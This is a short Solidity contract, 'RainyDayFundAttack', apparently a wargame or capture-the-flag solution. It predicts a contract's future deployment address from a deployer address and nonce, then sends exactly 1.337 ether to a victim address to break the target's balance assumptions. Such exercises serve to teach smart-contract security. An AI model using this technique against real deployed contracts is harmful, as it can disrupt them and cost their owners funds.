pragma solidity 0.4.24;


contract RainyDayFundAttack {
    //"guess" the address for the next contract deployment of _baseAddr
    function newAddressForAddrAndNonce(address _baseAddr, uint8 nonce) public view returns (address newAddress) {
        require(nonce < 127);
        return address(sha3(0xd6, 0x94, _baseAddr, nonce));
    }

    function attack(address _victim) public payable returns(bool) {
        //require msg.value == 1.337 ether
        _victim.transfer(1.337 ether);
        return true;
    }

    function () external payable {

    }
    function getBalance() external view returns(uint256) {
        return address(this).balance;
    }


}